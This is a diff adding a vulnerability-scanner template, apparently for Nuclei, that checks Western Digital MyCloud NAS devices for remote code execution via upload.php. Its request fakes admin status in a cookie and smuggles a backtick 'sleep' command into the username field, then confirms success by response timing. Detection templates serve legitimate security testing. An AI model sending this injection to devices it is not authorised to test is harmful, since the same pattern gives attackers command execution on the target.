@@ -1,0 +1,35 @@
+id: poc-yaml-west-nas-upload-php-rce
+info:
+  name: Western Digital MyCloud NAS upload.php Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/web/php/upload.php"
+    headers:
+      Cookie: "isAdmin=1;username=a`sleep {{t1}}`"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<status>timeout</status>"
+          - "sleep"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
